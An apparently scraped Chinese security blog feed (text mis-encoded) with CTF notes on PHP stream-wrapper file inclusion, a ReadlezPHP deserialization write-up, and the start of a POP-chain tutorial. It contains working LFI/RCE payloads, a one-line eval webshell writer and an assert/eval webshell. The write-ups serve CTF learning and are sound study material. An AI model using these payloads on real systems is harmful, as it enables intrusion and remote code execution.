<p>(&gt;=5.3.6)å…è®¸ç›´æ¥è®¿é—®æŒ‡å®šçš„æ–‡ä»¶æè¿°ç¬¦ã€‚ä¾‹å¦‚ php://fd/3 å¼•ç”¨äº†æ–‡ä»¶æè¿°ç¬¦ 3ã€‚</p>
<h2 id="phpmemory-phptemp">3.4. php://memory, php://temp</h2>
<p>(&gt;=5.1.0)ä¸€ä¸ªç±»ä¼¼æ–‡ä»¶åŒ…è£…å™¨çš„æ•°æ®æµï¼Œå…è®¸è¯»å†™ä¸´æ—¶æ•°æ®ã€‚ä¸¤è€…çš„å”¯ä¸€åŒºåˆ«æ˜¯ php://memory æ€»æ˜¯æŠŠæ•°æ®å‚¨å­˜åœ¨å†…å­˜ä¸­ï¼Œè€Œ php://temp ä¼šåœ¨å†…å­˜é‡è¾¾åˆ°é¢„å®šä¹‰çš„é™åˆ¶åï¼ˆé»˜è®¤æ˜¯ 2MBï¼‰å­˜å…¥ä¸´æ—¶æ–‡ä»¶ä¸­ã€‚ä¸´æ—¶æ–‡ä»¶ä½ç½®çš„å†³å®šå’Œ sys_get_temp_dir() çš„æ–¹å¼ä¸€è‡´ã€‚</p>
<h2 id="phpfilter">3.5. php://filter â­</h2>
<p>(&gt;=5.0.0)ä¸€ç§å…ƒå°è£…å™¨ï¼Œè®¾è®¡ç”¨äºæ•°æ®æµæ‰“å¼€æ—¶çš„ç­›é€‰è¿‡æ»¤åº”ç”¨ã€‚å¯¹äºä¸€ä½“å¼ï¼ˆall-in-oneï¼‰çš„æ–‡ä»¶å‡½æ•°éå¸¸æœ‰ç”¨ï¼Œç±»ä¼¼ readfile()ã€file() å’Œ file_get_contents()ï¼Œåœ¨æ•°æ®æµå†…å®¹è¯»å–ä¹‹å‰æ²¡æœ‰æœºä¼šåº”ç”¨å…¶ä»–è¿‡æ»¤å™¨ã€‚</p>
<p>äº‹å®ä¸Šï¼Œåœ¨includeå‡½æ•°çš„ä½¿ç”¨ä¸Šï¼Œç»å¸¸ä¼šé€ æˆä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼Œè€Œfile_get_contents()å’Œfile_put_contents()è¿™æ ·å‡½æ•°ä¸‹ï¼Œå¸¸å¸¸ä¼šæ„æˆgetshellç­‰æ›´ä¸¥é‡çš„æ¼æ´ã€‚</p>
<h3 id="phpfilterå‚æ•°è¯¦è§£">3.5.1. php://filterå‚æ•°è¯¦è§£</h3>
<p>php://filter ç›®æ ‡ä½¿ç”¨ä»¥ä¸‹çš„å‚æ•°ä½œä¸ºå®ƒè·¯å¾„çš„ä¸€éƒ¨åˆ†ã€‚ å¤åˆè¿‡æ»¤é“¾èƒ½å¤Ÿåœ¨ä¸€ä¸ªè·¯å¾„ä¸ŠæŒ‡å®šã€‚è¯¦ç»†ä½¿ç”¨è¿™äº›å‚æ•°å¯ä»¥å‚è€ƒå…·ä½“èŒƒä¾‹ã€‚</p>
<table>
<thead>
<tr class="header">
<th>php://filterå‚æ•°</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>resource=<è¦è¿‡æ»¤çš„æ•°æ®æµ></td>
<td>å¿…é¡»é¡¹ã€‚æŒ‡å®šäº†è¦ç­›é€‰è¿‡æ»¤çš„æ•°æ®æµ</td>
</tr>
<tr class="even">
<td>read=<è¯»é“¾çš„è¿‡æ»¤å™¨></td>
<td>å¯é€‰é¡¹ã€‚å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥<code>|</code>åˆ†éš”</td>
</tr>
<tr class="odd">
<td>write=<å†™é“¾çš„è¿‡æ»¤å™¨></td>
<td>å¯é€‰é¡¹ã€‚å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥<code>|</code>åˆ†éš”</td>
</tr>
<tr class="even">
<td>&lt;; ä¸¤ä¸ªé“¾çš„ç­›é€‰åˆ—è¡¨&gt;</td>
<td>ä»»ä½•æ²¡æœ‰ä»¥ read= æˆ– write= ä½œå‰ç¼€ çš„ç­›é€‰å™¨åˆ—è¡¨ä¼šè§†æƒ…å†µåº”ç”¨äºåº¦æˆ–å†™é“¾ã€‚</td>
</tr>
</tbody>
</table>
<h3 id="å¯ç”¨çš„è¿‡æ»¤å™¨">3.5.2. å¯ç”¨çš„è¿‡æ»¤å™¨</h3>
<p>å‚è€ƒï¼š<a href="https://www.php.net/manual/zh/filters.php">PHP: å¯ç”¨è¿‡æ»¤å™¨åˆ—è¡¨ - Manual</a></p>
<table>
<thead>
<tr class="header">
<th>å­—ç¬¦ä¸²è¿‡æ»¤å™¨</th>
<th>ä½œç”¨</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>string.rot13</td>
<td>ç­‰åŒäºstr_rot13(), rot13å˜åŒ–</td>
</tr>
<tr class="even">
<td>string.toupper</td>
<td>ç­‰åŒäºstrtoupper(), è½¬å¤§å†™å­—æ¯</td>
</tr>
<tr class="odd">
<td>string.tolower</td>
<td>ç­‰åŒäºstrtolowe(), è½¬å°å†™å­—æ¯</td>
</tr>
<tr class="even">
<td>string.strip_tags</td>
<td>ç­‰åŒäºstrip_tags(), å–å‡ºhtmlï¼Œphpè¯­è¨€æ ‡ç­¾</td>
</tr>
</tbody>
</table>
<table>
<colgroup>
<col style="width: 50%" />
<col style="width: 50%" />
</colgroup>
<thead>
<tr class="header">
<th>è½¬æ¢è¿‡æ»¤å™¨</th>
<th>ä½œç”¨</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>convert.base64-encode &amp; convert.base64-decode</td>
<td>ç­‰åŒäºbase64_encode()å’Œbase64_decode()ï¼Œbase64ç¼–ç å’Œè§£ç </td>
</tr>
<tr class="even">
<td>convert.quoted-printable-encode &amp; convert.quoted-printable-decode</td>
<td>quoted-printable å­—ç¬¦ä¸²ä¸ 8-bit å­—ç¬¦ä¸²ç¼–ç è§£ç </td>
</tr>
</tbody>
</table>
<table>
<colgroup>
<col style="width: 50%" />
<col style="width: 50%" />
</colgroup>
<thead>
<tr class="header">
<th>å‹ç¼©è¿‡æ»¤å™¨</th>
<th>ä½œç”¨</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>zlib.deflate &amp; zlib.inflate</td>
<td>åœ¨æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸­åˆ›å»º gzip å…¼å®¹æ–‡ä»¶çš„æ–¹æ³•ï¼Œä½†ä¸äº§ç”Ÿå‘½ä»¤è¡Œå·¥å…·å¦‚ gzipçš„å¤´å’Œå°¾ä¿¡æ¯ã€‚åªæ˜¯å‹ç¼©å’Œè§£å‹æ•°æ®æµä¸­çš„æœ‰æ•ˆè½½è·éƒ¨åˆ†ã€‚</td>
</tr>
<tr class="even">
<td>bzip2.compress &amp; bzip2.decompress</td>
<td>åŒä¸Šï¼Œåœ¨æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸­åˆ›å»º bz2 å…¼å®¹æ–‡ä»¶çš„æ–¹æ³•ã€‚</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr class="header">
<th>åŠ å¯†è¿‡æ»¤å™¨</th>
<th>ä½œç”¨</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>mcrypt.*</td>
<td>libmcrypt å¯¹ç§°åŠ å¯†ç®—æ³•</td>
</tr>
<tr class="even">
<td>mdecrypt.*</td>
<td>libmcrypt å¯¹ç§°è§£å¯†ç®—æ³•</td>
</tr>
</tbody>
</table>
<h3 id="å¸¸ç”¨ç¤ºä¾‹">3.5.3. å¸¸ç”¨ç¤ºä¾‹</h3>
<ol type="1">
<li><p>php://filter/read=convert.base64-encode/resource=fileName <strong>è¯»å–æ–‡ä»¶æºç </strong>ï¼ˆé’ˆå¯¹phpæ–‡ä»¶éœ€è¦base64ç¼–ç ï¼Œå¦åˆ™æ— æ³•è¯»å–å†…å®¹ï¼‰</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429104027.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429104041.png" /></p></li>
<li><p>php://input + {POST å†…å®¹} <strong>æ‰§è¡Œphpä»£ç </strong></p>
<p>éœ€è¦å…ˆè®¾ç½®ï¼š</p>
<ul>
<li>allow_url_fopen: Off/On</li>
<li>allow_url_include: On</li>
</ul>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429104901.png" /></p>
<p>è¿˜å¯ä»¥å†™å…¥ä¸€å¥è¯æœ¨é©¬ <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> fputs(fopen(<span class="string">&#x27;1juhua.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_GET[cmd]); ?&gt;&#x27;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429105017.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429105035.png" /></p></li>
</ol>
<h1 id="data-åè®®">4. data:// åè®®</h1>
<p>ä½œç”¨ï¼š</p>
<ul>
<li>ä½œç”¨ï¼šè‡ªPHP&gt;=5.2.0èµ·ï¼Œå¯ä»¥ä½¿ç”¨data://æ•°æ®æµå°è£…å™¨ï¼Œä»¥ä¼ é€’ç›¸åº”æ ¼å¼çš„æ•°æ®ã€‚é€šå¸¸å¯ä»¥ç”¨æ¥æ‰§è¡ŒPHPä»£ç ã€‚</li>
</ul>
<p>æ¡ä»¶ï¼š</p>
<ul>
<li>allow_url_fopen: On</li>
<li>allow_url_include: On</li>
</ul>
<p>ç”¨æ³•ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. data://text/plain,</span><br><span class="line">2. data://text/plain;base64,</span><br></pre></td></tr></table></figure></p>
<p>ç¤ºä¾‹ï¼š</p>
<ol type="1">
<li><p><code>?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429112329.png" /></p></li>
<li><p><code>data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</code> ï¼ˆå…¶ä¸­ + è¦ç”¨ %2b ä»£æ›¿ï¼‰</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429113406.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429113428.png" /></p></li>
</ol>
<h1 id="zip-bzip2-zlib-åè®®">5. zip:// &amp; bzip2:// &amp; zlib://Â åè®®</h1>
<p>ä½œç”¨ï¼š</p>
<ul>
<li>zip:// &amp; bzip2:// &amp; zlib:// å‡å±äºå‹ç¼©æµï¼Œå¯ä»¥è®¿é—®å‹ç¼©æ–‡ä»¶ä¸­çš„å­æ–‡ä»¶ï¼Œæ›´é‡è¦çš„æ˜¯ä¸éœ€è¦æŒ‡å®šåç¼€åï¼Œå¯ä¿®æ”¹ä¸ºä»»æ„åç¼€ï¼šjpg png gif xxx ç­‰ç­‰ã€‚</li>
</ul>
<p>æ¡ä»¶ï¼š</p>
<ul>
<li>allow_url_fopen: Off/On</li>
<li>allow_url_include: Off/On</li>
</ul>
<p>ç¤ºä¾‹ï¼š</p>
<ol type="1">
<li><p>zip://{å‹ç¼©æ–‡ä»¶ç»å¯¹è·¯å¾„}%23{å‹ç¼©æ–‡ä»¶å†…çš„å­æ–‡ä»¶å}</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429114149.png" /></p>
<p>å°†å‹ç¼©åŒ…çš„åå­—å‘½åä¸º text.jpg ä¹Ÿå¯ä»¥è¢«è¯†åˆ«</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429114830.png" /></p></li>
<li><p>compress.bzip2://{filename.bz2}</p>
<p>ä¸ä¸Šä¸‹ä¸€æ ·ï¼Œå‹ç¼©åŒ…çš„åç¼€å¯ä»¥ä»»æ„ï¼Œä½†æ˜¯å¿…é¡»æ˜¯bz2çš„å‹ç¼©æ–¹æ³•å‹ç¼©å½¢æˆçš„å‹ç¼©åŒ…ã€‚</p></li>
<li><p>compress.zlib://{filename.gz}</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429114624.png" /></p>
<p>å°†å‹ç¼©åŒ…çš„åå­—å‘½åä¸º text.txt.jpg ä¹Ÿå¯ä»¥è¢«è¯†åˆ«</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429114743.png" /></p></li>
</ol>
<h1 id="http-https-åè®®">6. http:// &amp; https:// åè®®</h1>
<p>ä½œç”¨ï¼š</p>
<ul>
<li>å¸¸è§„ URL å½¢å¼ï¼Œå…è®¸é€šè¿‡ HTTP 1.0 çš„ GETæ–¹æ³•ï¼Œä»¥åªè¯»è®¿é—®æ–‡ä»¶æˆ–èµ„æºã€‚<strong>CTFä¸­é€šå¸¸ç”¨äºè¿œç¨‹åŒ…å«</strong>ã€‚</li>
</ul>
<p>æ¡ä»¶ï¼š</p>
<ul>
<li>allow_uyrl_fopen: On</li>
<li>allow_url_include: On</li>
</ul>
<p>ç”¨æ³•ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://example.com</span><br><span class="line">http://example.com/file.php?var1=val1&amp;var2=val2</span><br><span class="line">http://user:password@example.com</span><br><span class="line">https://example.com</span><br><span class="line">https://example.com/file.php?var1=val1&amp;var2=val2</span><br><span class="line">https://user:password@example.com</span><br></pre></td></tr></table></figure></p>
<p>ç¤ºä¾‹ï¼š</p>
<p><code>http://localhost/test/test.php?file=http://127.0.0.1/index.php</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429115152.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429115222.png" /></p>
<h1 id="phar-åè®®">7. phar:// åè®®</h1>
<p>phar:// åè®®ä¸ zip:// ç±»ä¼¼ï¼ŒåŒæ ·å¯ä»¥è®¿é—®zipæ ¼å¼å‹ç¼©åŒ…å†…å®¹ã€‚ä½†æ˜¯æ ¼å¼ä¸zip://ä¸åŒï¼Œä¸¤è€…æ ¼å¼å¯¹æ¯”ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zip://  -&gt; zip://&#123;å‹ç¼©æ–‡ä»¶ç»å¯¹è·¯å¾„&#125;%23&#123;å‹ç¼©æ–‡ä»¶å†…çš„å­æ–‡ä»¶å&#125;</span><br><span class="line">phar:// -&gt; phar://&#123;å‹ç¼©æ–‡ä»¶ç»å¯¹è·¯å¾„\å‹ç¼©æ–‡ä»¶å†…çš„å­æ–‡ä»¶å&#125;</span><br></pre></td></tr></table></figure></p>
<p>ç›¸åŒçš„ï¼š</p>
<ul>
<li><strong>ä¸¤è€…éƒ½å¯¹å‹ç¼©åŒ…çš„åç¼€åä¸æ•æ„Ÿ</strong>ã€‚</li>
<li>æ¡ä»¶ä¸€æ ·ã€‚</li>
</ul>
<p>ç¤ºä¾‹ï¼š<code>http://localhost/test/test.php?file=phar://D:\phpStudy2018\PHPTutorial\WWW\test\test.zip\test.txt</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429115412.png" /></p>
<p>å°†å‹ç¼©åŒ…çš„åå­—å‘½åä¸º text.jpg ä¹Ÿå¯ä»¥è¢«è¯†åˆ«</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429115618.png" /></p>
<h1 id="æ€»ç»“">8. æ€»ç»“</h1>
<p>PHPä¼ªåè®®åœ¨CTFè›®å¸¸è§çš„ï¼Œæ˜¯ç»å¸¸ä¼šé‡åˆ°çš„å‡ºé¢˜ç‚¹ï¼Œ</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429115825.png" /></p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHPä¼ªåè®®</tag>
      </tags>
  </entry>
  <entry>
    <title>NPUCTF2020 ReadlezPHP</title>
    <url>/2022/04/16/NPUCTF2020%20ReadlezPHP/</url>
    <content><![CDATA[<p>é¢˜ç›®åœ°å€ï¼š<a href="https://buuoj.cn/challenges#%5BNPUCTF2020%5DReadlezPHP">ReadlezPHP</a></p>
<span id="more"></span>
<h1 id="é¢˜ç›®ä¿¡æ¯">é¢˜ç›®ä¿¡æ¯</h1>
<p>è¿›å…¥ç¯å¢ƒï¼Œå¾—åˆ°å¦‚ä¸‹ä¿¡æ¯</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416090154.png" /></p>
<p>æ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„ï¼ŒæŸ¥çœ‹ä¸€ä¸‹æºç ï¼Œå‘ç°äº†</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416090217.png" /></p>
<p>ç›´æ¥è®¿é—®è¯¥æ–‡ä»¶ï¼Œå¾—åˆ°æºç ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">&quot;Y-m-d h:i:s&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        <span class="variable">$b</span> = <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$b</span>(<span class="variable">$a</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> HelloPhp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="variable">$ppp</span> = unserialize(<span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>]); </span><br></pre></td></tr></table></figure></p>
<h1 id="è§£é¢˜">è§£é¢˜</h1>
<p>æœ¬é¢˜è€ƒçš„æ¯”è¾ƒçš„ç®€å•ï¼Œå°±æ˜¯å•çº¯çš„ååºåˆ—åŒ–ï¼Œç¼–å†™å¦‚ä¸‹ä»£ç ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&#x27;id&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span> = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">new</span> HelloPhp;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$p</span>);</span><br></pre></td></tr></table></figure></p>
<p>å°†å¾—åˆ°çš„å­—ç¬¦ä¸²ç”¨GETæ–¹å¼æäº¤ç»™dataå‚æ•°ã€‚æŒ‰é“ç†æ¥è¯´ï¼Œæ­¤æ—¶å°±ä¼šæ‰§è¡Œç›¸åº”çš„å‘½ä»¤ï¼Œä½†å¥‡æ€ªçš„æ˜¯ç½‘é¡µè¿”å›äº†æ—¶é—´ï¼Œè€Œæ²¡è¿”å›æ‰§è¡Œ<code>system('id')</code>å¾—åˆ°çš„ç»“æœã€‚æŠŠ<code>system</code>ç”¨å…¶ä»–æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°æ›¿ä»£ï¼Œå‘ç°éƒ½ä¸è¡Œã€‚ä¼°è®¡è¢«è¿‡æ»¤äº†å§ã€‚</p>
<p>åˆå°è¯•äº†æ‰§è¡ŒPHPä»£ç çš„å‡½æ•°ï¼Œå¦‚<code>eval()</code>ã€<code>assert()</code>ç­‰ï¼Œå‘ç°å½“æ‰§è¡Œåˆ°<code>assert(phpinfo())</code>çš„æ—¶å€™ï¼Œé¡µé¢æ˜¾ç¤ºäº†å¯¹åº”çš„ä¿¡æ¯ã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416090906.png" /></p>
<p>å¹¶ä¸”å‘ç°ç›´æ¥æ‰§è¡Œ<code>eval(phpinfo())</code>é¡µé¢æ²¡æœ‰æ˜¾ç¤ºï¼Œè€Œ<code>assert(eval(phpinfo()))</code>æ—¶ï¼Œé¡µé¢æ˜¾ç¤ºäº†å†…å®¹ã€‚å› æ­¤ï¼Œå°è¯•å†™å…¥ä¸€å¥è¯ï¼Œç„¶åèšå‰‘è¿æ¥ <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">assert(<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]))</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416091327.png" /></p>
<p>ä½†æ˜¯å‘ç°ä»€ä¹ˆä¿¡æ¯éƒ½æ²¡æœ‰ï¼å› æ­¤åˆå›åˆ°phpinfo()ç•Œé¢æœç´¢äº†ä¸€ä¸‹<code>flag</code>ï¼Œå±…ç„¶è¿˜çœŸè—åœ¨è¿™é‡Œï¼</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416091517.png" /></p>
<h1 id="æ€»ç»“">æ€»ç»“</h1>
<p>æˆ‘è®¤ä¸ºè¿™é“é¢˜åªè¦å­¦ä¼šäº†ä»¥ä¸‹ä¸¤ä¸ªçŸ¥è¯†ç‚¹å³å¯ï¼š</p>
<ul>
<li>ååºåˆ—åŒ–ï¼›</li>
<li>é€šè¿‡è¿™ç§æ–¹å¼ä¸Šçº¿èšå‰‘ï¼›</li>
</ul>
<p>flagçš„ä½ç½®ç€å®ä»¤äººæƒ³ä¸åˆ°ã€‚</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PHPååºåˆ—åŒ–</tag>
      </tags>
  </entry>
  <entry>
    <title>POPé“¾</title>
    <url>/2022/04/15/POP%E9%93%BE/</url>
    <content><![CDATA[<p>ä¸ªäººçŸ¥è¯†ç‚¹è®°å½•ã€‚</p>
<span id="more"></span>
<h1 id="é­”æœ¯æ–¹æ³•">é­”æœ¯æ–¹æ³•</h1>
<p>å¯ä»¥å‚è€ƒä¸€ä¸‹ï¼š[[ååºåˆ—åŒ–çŸ¥è¯†ç‚¹#2 å¸¸è§çš„é­”æœ¯æ–¹æ³•|å¸¸è§é­”æœ¯æ–¹æ³•]]</p>
<p>å¸¸è§çš„é­”æœ¯æ–¹æ³•æ˜¯æ„é€ POPé“¾å¾—åˆ°å…³é”®ï¼</p>
<h1 id="å¯»æ‰¾popé“¾">å¯»æ‰¾POPé“¾</h1>
<p>POPé“¾æ„é€ é¦–å…ˆå°±æ˜¯è¦æ‰¾åˆ°å¤´å’Œå°¾ï¼Œä¹Ÿå°±æ˜¯ç”¨æˆ·èƒ½ä¼ å…¥å‚æ•°çš„åœ°æ–¹ï¼ˆå¤´ï¼‰å’Œæœ€ç»ˆè¦æ‰§è¡Œå‡½æ•°æ–¹æ³•çš„åœ°æ–¹ï¼ˆå°¾ï¼‰ã€‚æ‰¾åˆ°å¤´å°¾ä¹‹åè¿›è¡Œåæ¨è¿‡ç¨‹ï¼Œä»å°¾éƒ¨å¼€å§‹ä¸€æ­¥æ­¥æ‰¾åˆ°èƒ½è§¦å‘ä¸Šä¸€æ­¥çš„åœ°æ–¹ï¼Œç›´åˆ°æ‰¾åˆ°ä¼ å‚å¤„ï¼Œæ­¤æ—¶å®Œæ•´çš„POPé“¾å°±æ˜¾è€Œæ˜“è§äº†ã€‚CTFèµ›ä¸­ä¸€èˆ¬å°¾éƒ¨å°±æ˜¯get flagçš„æ–¹æ³•ï¼Œå¤´éƒ¨åˆ™æ˜¯GET/POSTä¼ å‚ã€‚</p>
<p>é¢˜ç›®ï¼š2020å¼ºç½‘æ¯-Webè¾…åŠ©</p>
<p>æºç å¦‚ä¸‹ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// class.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">player</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$pass</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$admin</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$user</span>, <span class="variable">$pass</span>, <span class="variable">$admin</span> = <span class="number">0</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;user = <span class="variable">$user</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;pass = <span class="variable">$pass</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;admin = <span class="variable">$admin</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_admin</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;admin;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">topsolo</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span> = <span class="string">&#x27;Riven&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">TP</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (gettype(<span class="keyword">$this</span>-&gt;name) === <span class="string">&quot;function&quot;</span> <span class="keyword">or</span> gettype(<span class="keyword">$this</span>-&gt;name) === <span class="string">&quot;object&quot;</span>)&#123; <span class="comment"># gettype()è·å–å˜é‡ç±»å‹</span></span><br><span class="line">            <span class="variable">$name</span> = <span class="keyword">$this</span>-&gt;name; </span><br><span class="line">            <span class="variable">$name</span>(); <span class="comment"># å¯ä»¥è§¦å‘ __invoke()</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123; <span class="comment"># å½“ç¨‹åºç»“æŸæ—¶ï¼Œè‡ªåŠ¨æ‰§è¡Œè¿™ä¸ªï¼ˆå­˜åœ¨è¯¥ç±»å¯¹è±¡ï¼‰ï¼Œä»è€Œè°ƒç”¨TPï¼ˆï¼‰</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;TP(); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">midsolo</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;name !== <span class="string">&#x27;Yasuo&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;name = <span class="string">&#x27;Yasuo&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;No Yasuo! No Soul!\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;Gank();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Gank</span>(<span 